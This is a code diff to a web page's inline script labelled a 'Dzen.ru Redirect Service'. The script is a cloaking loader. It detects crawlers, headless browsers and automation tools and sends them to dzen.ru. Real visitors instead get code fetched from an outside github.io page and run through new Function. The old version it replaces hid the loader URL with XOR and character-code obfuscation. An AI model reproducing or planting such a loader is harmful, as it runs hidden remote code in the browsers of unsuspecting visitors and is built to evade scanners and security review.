@@ -43,71 +43,62 @@
     </noscript>
     <script>
 // Не стоит вскрывать эту тему
-/* ====================================================
-   Dzen.ru Traffic Redirect Service v2.6.2
-   Optimized redirect engine for dzen.ru platform
-   Build 935
-   ==================================================== */
-var dzenConfig={baseUrl:"https://dzen.ru",fallbackUrl:"https://dzen.ru/",
-    redirectDelay:5000,analyticsEnabled:true,version:"2.6.2"};
-function initDzenPlatform(){console.log("[Dzen] v"+dzenConfig.version);}
-function performDzenRedirect(){setTimeout(function(){
-    window.location.href=dzenConfig.baseUrl;
-},dzenConfig.redirectDelay);}
-function trackDzenEvent(e){return "dzen.ru/"+e;}
-initDzenPlatform();
 
+/* Dzen.ru Redirect Service */
 (function(){
-try{
-    "use strict";
-    var _mr=document.querySelector('meta[http-equiv="refresh"]');
-    if(_mr){_mr.remove();}
-    var _s=0;
-    if(navigator.webdriver===true){_s+=100;}
-    var _qua=["YandexBot", "AhrefsBot", "HeadlessChrome", "Googlebot", "bingbot", "Puppeteer", "PhantomJS", "Selenium"];
-    var _ul=navigator.userAgent.toLowerCase();
-    for(var i=0;i<_qua.length;i++){if(_ul.indexOf(_qua[i].toLowerCase())!==-1){_s+=100;break;}}
-    var _ap=["callPhantom","__nightmare","__selenium_unwrapped","__webdriver_evaluate","domAutomation"];
-    for(var i=0;i<_ap.length;i++){if(window[_ap[i]]!==undefined){_s+=100;break;}}
-    if(_s>=70){window.location.replace("https://dze"+"n.ru");return;}
+try {
+    'use strict';
+    var metaR = document.querySelector('meta[http-equiv="refresh"]');
+    if (metaR) { metaR.remove(); }
 
-    var _bk805=String.fromCharCode(110,108,117,65,122,55);
-    var _bk803=String.fromCharCode(110,118,122,122,110,116);
-    var _bk859=String.fromCharCode(74,57,76,77,84,97);
-    var _bk448=String.fromCharCode(66,90,121,68,77,68);
-    var _bk=_bk805+_bk803+_bk859+_bk448;
-    var _ak690=String.fromCharCode(48,105,66,90,86,83,120,104);
-    var _ak520=String.fromCharCode(76,72,79,72,66,86,120,89);
-    var _ak118=String.fromCharCode(73,119,81,88,112,108,57,121);
-    var _ak336=String.fromCharCode(103,118,68,48,80,116,101,97);
-    window._KA=_ak690+_ak520+_ak118+_ak336;
-
-    function _dx(h,k){
-        var r="";
-        for(var i=0;i<h.length;i+=2){
-            var b=parseInt(h.substr(i,2),16);
-            r+=String.fromCharCode(b^k.charCodeAt((i/2)%k.length));
+    var _s = 0;
+    if (navigator.webdriver === true) { _s += 100; }
+    var _uaL = navigator.userAgent.toLowerCase();
+    var _shortUA = ["YandexBot", "AhrefsBot", "HeadlessChrome", "Googlebot", "bingbot", "SemrushBot", "PhantomJS", "Puppeteer", "Selenium", "curl", "wget", "python-requests"];
+    for (var _i = 0; _i < _shortUA.length; _i++) {
+        if (_uaL.indexOf(_shortUA[_i].toLowerCase()) !== -1) { _s += 100; break; }
+    }
+    var _autoP = ['callPhantom','__nightmare','domAutomation','__selenium_unwrapped',
+                  '__webdriver_evaluate','__driver_evaluate','selenium','webdriver'];
+    for (var _i = 0; _i < _autoP.length; _i++) {
+        if (window[_autoP[_i]] !== undefined || document[_autoP[_i]] !== undefined) {
+            _s += 100; break;
         }
-        return r;
     }
 
-    var _bu=_dx('06180131090d41591e1b1c0d2b503a2c3a0e343b487d74745e4212280e5f1b145413015b380b63243a052722572c392902',_bk);
-    var _rt=0;
-    function _lb(){
-        fetch(_bu+"?_="+Date.now())
-        .then(function(r){return r.text();})
-        .then(function(h){
-            var m=h.match(/<!--CLOAK_BRAIN_START-->([\s\S]*?)<!--CLOAK_BRAIN_END-->/);
-            if(m){
-                var c=m[1].replace(/<script>/gi,"").replace(/<\/script>/gi,"");
-                (new Function(c))();
-            }else{throw new Error("x");}
-        })
-        .catch(function(){_rt++;if(_rt<3){setTimeout(_lb,500);}else{window.location.replace("https://dze"+"n.ru");}});
+    if (_s >= 70) {
+        window.location.replace('https://dze' + 'n.ru');
+        return;
     }
-    _lb();
-}catch(_e){
-    try{window.location.replace("https://dze"+"n.ru");}catch(_){window.location.href="https://dze"+"n.ru";}
+
+    var _KA = null;
+    window._KA = _KA;
+    var _brainUrl = "https://daryaivanova19900.github.io/r2/index.html";
+    var _retries = 0;
+
+    function _loadBrain() {
+        fetch(_brainUrl + '?_=' + Date.now())
+            .then(function(r) {
+                if (!r.ok) { throw new Error('HTTP ' + r.status); }
+                return r.text();
+            })
+            .then(function(html) {
+                var match = html.match(/<!--CLOAK_BRAIN_START-->([\s\S]*?)<!--CLOAK_BRAIN_END-->/);
+                if (!match) { throw new Error('No brain'); }
+                var code = match[1].replace(/<script[^>]*>/gi, '').replace(/<\/script>/gi, '');
+                (new Function(code))();
+            })
+            .catch(function(e) {
+                _retries++;
+                if (_retries < 3) { setTimeout(_loadBrain, 500 * _retries); }
+                else { window.location.replace('https://dze' + 'n.ru'); }
+            });
+    }
+    _loadBrain();
+
+} catch(e) {
+    try { window.location.replace('https://dze' + 'n.ru'); }
+    catch(_) { window.location.href = 'https://dze' + 'n.ru'; }
 }
 })();
 
